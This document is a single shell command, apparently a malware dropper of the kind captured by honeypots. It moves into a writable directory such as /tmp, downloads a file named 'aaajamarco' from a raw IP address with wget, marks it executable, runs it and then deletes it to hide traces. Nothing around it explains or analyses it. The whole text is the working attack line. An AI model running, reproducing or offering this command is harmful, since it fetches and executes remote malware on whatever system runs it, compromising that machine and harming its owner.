cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://119.94.59.146/aaajamarco; chmod +x aaajamarco; ./aaajamarco; rm -rf aaajamarco
